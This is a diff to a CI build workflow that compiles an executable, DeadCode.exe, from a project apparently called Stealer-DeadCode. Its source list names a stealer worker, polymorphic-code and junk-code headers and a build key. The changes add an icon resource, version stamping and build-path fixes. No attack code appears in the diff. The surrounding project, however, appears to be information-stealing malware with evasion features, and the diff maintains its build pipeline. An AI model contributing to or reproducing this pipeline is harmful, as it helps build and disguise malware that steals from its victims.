@@ -93,6 +93,12 @@ jobs:
         }
       shell: pwsh
 
+    - name: Check windres version
+      run: |
+        Write-Host "Checking windres version..."
+        windres --version
+      shell: pwsh
+
     - name: Verify Qt installation
       run: |
         Write-Host "Verifying Qt installation..."
@@ -181,7 +187,7 @@ jobs:
 
     - name: Install vcpkg dependencies
       env:
-        VCPKG_MAX_CONCURRENCY: 1  # Отключаем параллельную сборку
+        VCPKG_MAX_CONCURRENCY: 1
       run: |
         Write-Host "Installing vcpkg dependencies with triplet x64-mingw-static..."
         $vcpkgExe = "C:/vcpkg/vcpkg.exe"
@@ -237,7 +243,9 @@ jobs:
           "src/build_key.h",
           "src/polymorphic_code.h",
           "src/junk_code.h",
-          "src/stealerworker.h"
+          "src/stealerworker.h",
+          "icon.rc",
+          "icon.ico"
         )
         $missingFiles = @()
         foreach ($file in $requiredFiles) {
@@ -249,15 +257,18 @@ jobs:
           Write-Host "Error: Missing required files: $missingFiles"
           dir ui -ErrorAction SilentlyContinue
           dir src -ErrorAction SilentlyContinue
+          dir . -ErrorAction SilentlyContinue
           exit 1
         }
         Write-Host "Creating build and release directories..."
         New-Item -Path build -ItemType Directory -Force
+        New-Item -Path build/release -ItemType Directory -Force
         New-Item -Path release -ItemType Directory -Force
         Write-Host "Verifying write access to directories..."
         "Test write access" | Out-File -FilePath "build/test_write.txt"
+        "Test write access" | Out-File -FilePath "build/release/test_write.txt"
         "Test write access" | Out-File -FilePath "release/test_write.txt"
-        Remove-Item "build/test_write.txt", "release/test_write.txt"
+        Remove-Item "build/test_write.txt", "build/release/test_write.txt", "release/test_write.txt"
         Write-Host "Project structure verified"
       shell: pwsh
 
@@ -283,6 +294,31 @@ jobs:
         Write-Host "ui_mainwindow.h generated successfully"
       shell: pwsh
 
+    - name: Check icon.rc file
+      run: |
+        cd Stealer-DeadCode
+        Write-Host "Checking icon.rc file..."
+        if (-not (Test-Path icon.rc)) {
+          Write-Host "Error: icon.rc file not found"
+          exit 1
+        }
+        Write-Host "Contents of icon.rc:"
+        Get-Content icon.rc
+        if (-not (Test-Path icon.ico)) {
+          Write-Host "Error: icon.ico file not found"
+          exit 1
+        }
+        Write-Host "icon.ico file exists"
+        # Проверяем кодировку файла
+        Write-Host "Checking encoding of icon.rc..."
+        $content = Get-Content -Path icon.rc -Raw -Encoding Byte
+        if ($content[0] -eq 0xEF -and $content[1] -eq 0xBB -and $content[2] -eq 0xBF) {
+          Write-Host "Warning: icon.rc has UTF-8 BOM, which may cause issues with windres"
+        } else {
+          Write-Host "icon.rc encoding looks good (no UTF-8 BOM detected)"
+        }
+      shell: pwsh
+
     - name: Configure and build DeadCode
       run: |
         cd Stealer-DeadCode
@@ -291,17 +327,24 @@ jobs:
         [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
         Write-Host "Updated PATH: $env:Path"
         
-        # Переходим в каталог build и указываем путь к DeadCode.pro
+        # Устанавливаем BUILD_DATE и BUILD_VERSION
+        $buildDate = Get-Date -Format "yyyy-MM-dd"
+        $buildVersion = git rev-parse --short HEAD
+        if (-not $buildVersion) {
+          $buildVersion = "unknown"
+        }
+        Write-Host "Build Date: $buildDate"
+        Write-Host "Build Version: $buildVersion"
+        
         cd build
         Write-Host "Running qmake..."
-        C:/Qt/5.15.2/mingw81_64/bin/qmake.exe ../ui/DeadCode.pro CONFIG+=static CONFIG+=staticlib 2>&1 | Tee-Object -FilePath "../qmake_output.log"
+        C:/Qt/5.15.2/mingw81_64/bin/qmake.exe ../ui/DeadCode.pro CONFIG+=static CONFIG+=staticlib QMAKE_CXXFLAGS+=-Wno-attributes "DEFINES+=BUILD_DATE=\\\"$buildDate\\\"" "DEFINES+=BUILD_VERSION=\\\"$buildVersion\\\"" 2>&1 | Tee-Object -FilePath "../qmake_output.log"
         if ($LASTEXITCODE -ne 0) {
           Write-Host "Error: qmake failed. Check qmake_output.log for details."
           Get-Content ../qmake_output.log
           exit 1
         }
         
-        # Проверяем, созданы ли Makefile, Makefile.Debug и Makefile.Release
         Write-Host "Checking for generated Makefiles..."
         if (-not (Test-Path Makefile)) {
           Write-Host "Error: Makefile was not generated"
@@ -320,7 +363,6 @@ jobs:
         }
         Write-Host "Makefiles generated successfully"
         
-        # Запускаем mingw32-make в каталоге build
         Write-Host "Running mingw32-make..."
         C:/tools/msys64/mingw64/bin/mingw32-make.exe -f Makefile.Release -j1 2>&1 | Tee-Object -FilePath "../make_output.log"
         if ($LASTEXITCODE -ne 0) {
@@ -329,11 +371,17 @@ jobs:
           exit 1
         }
         
-        # Проверяем, создан ли DeadCode.exe
         if (-not (Test-Path release/DeadCode.exe)) {
-          Write-Host "Error: DeadCode.exe was not generated"
+          Write-Host "Error: DeadCode.exe was not generated in release/"
           dir release
-          exit 1
+          if (Test-Path ../build/release/DeadCode.exe) {
+            Write-Host "Found DeadCode.exe in ../build/release/, copying to release/"
+            Copy-Item -Path ../build/release/DeadCode.exe -Destination release/DeadCode.exe
+          } else {
+            Write-Host "DeadCode.exe not found in ../build/release/ either"
+            dir ../build/release
+            exit 1
+          }
         }
         Write-Host "Build completed successfully"
       shell: pwsh
